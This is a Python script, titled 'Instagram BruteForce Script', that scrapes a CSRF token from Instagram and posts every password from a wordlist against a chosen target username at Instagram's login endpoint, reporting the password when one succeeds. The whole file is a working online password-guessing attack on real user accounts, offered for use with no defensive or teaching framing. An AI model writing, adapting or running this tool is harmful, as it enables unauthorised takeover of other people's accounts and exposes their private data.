import urllib.request as rq
import random
import urllib.parse as http_parser
import argparse
import time


def main(username, words):

  response = rq.urlopen('http://www.instagram.com')
  html = response.read()

  csrf_token = extract_csrf_token(html)

  for word in words:

    password = word.strip()

    craft_response(username, password, csrf_token)



def extract_csrf_token(text):

  page_text = str(text)

  result = page_text.find("csrf_token")
  after = page_text[result + len("csrf_token"):-1]


  csrf_token = after[:after.find(",")].replace(":", "").replace("\"", "")

  if len(csrf_token) == 0:
    print ("[-] Error extraction CSRF token, exiting...")
    exit()
  else:

    print ("CSRF token is: " + csrf_token)
    return csrf_token



def craft_response(username, password, csrf_token):

  user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
             "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1",
             "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
             "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
             "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"]

  URL = "https://www.instagram.com/accounts/login/ajax/"


  values = {
    'username': username,
    'enc_password': encode_password(password),
    'Ps': '',
    'queryParams': '{}',
    'optIntoOneTap': 'false'
  }


  headers = {
    "Host": "www.instagram.com",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-CSRFToken": csrf_token,
    "X-Instagram-AJAX": "1",
    "X-IG-WWW-Claim": "0",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://www.instagram.com",
    "Referer": "https://www.instagram.com/",
    "Cookie": "csrf_token=" + csrf_token
  }


  data = http_parser.urlencode(values)
  data = data.encode('ascii')
  req = rq.Request(URL, data, headers)



  with rq.urlopen(req) as response:
    the_page = response.read()

    #print (the_page)

    try:

      if "\"authenticated\": false" in str(the_page):

        print ("Trying: " + "\"" + password + "\"" +"| FAILURE")

      else:
        print ("Success! Password is: " + password)
        exit()

    except Exception as err:
      print("Error: {0}".format(err))

def encode_password(password):

  formatted_time = str(int(time.time()))

  enc_password = '#PWD_INSTAGRAM_BROWSER:0:' + formatted_time + ':' + password

  return enc_password



if __name__ == "__main__":


  parser = argparse.ArgumentParser(
        description="Instagram BruteForce Script",
        epilog="python angel_brute.py -u user_test -w words.txt"
    )

  # required argument
  parser.add_argument('-u', '--username', action="store", required=True,
                  help='Target Username')
  parser.add_argument('-w', '--word', action="store", required=True,
                  help='Words list path')

  args = parser.parse_args()

  USER = args.username

  try:
      words = open(args.word).readlines()
  except IOError:
      print("[-] Error: Check your word list file path\n")
      sys.exit(1)

  main(USER, words)




